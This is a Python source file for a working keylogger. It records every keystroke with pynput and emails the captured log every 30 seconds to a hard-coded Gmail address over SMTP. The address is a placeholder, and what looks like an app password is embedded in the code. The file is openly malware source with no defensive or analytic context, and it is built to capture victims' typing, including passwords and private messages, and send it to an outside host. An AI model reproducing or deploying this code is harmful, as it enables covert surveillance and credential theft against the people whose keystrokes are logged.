#!/usr/bin/env python3

import pynput.keyboard 
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:

    def __init__(self):
        self.log = ""
        self.shutdown_request = False
        self.timer = None
        self.is_first_run = True


    # Metodos
    def pressed_key(self, key):

        try:
            self.log += str(key.char)  

        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " 'Backspace' ", key.enter: " 'Enter' ", key.shift: " 'Shift' ",key.ctrl: " 'Ctrl' ", key.alt: " 'Alt' ", "None1": " | ", "None2": " @ ", key.delete: " 'Suprimir' ", key.left: " 'Flecha Derecha' ", key.right: " 'Fleha Izquierda' ", key.down: " 'Flecha Abajo' ", key.up: " 'Flecha Arriba' "} 

            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)


    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server: # Creatin the conection
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        
        print(f"[+] Emails sent Successfully!!")

    # Recursive Function
    def report(self):
        email_body = "[+] Keyl logger has been successfully started" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "yourE-mail@gmail.com", ["yourE-mail@gmail.com"], "jvfd cnyh uvap svwo")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
        
        if not self.shutdown_request:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.shutdown_request = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        # Listen
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join() # Start
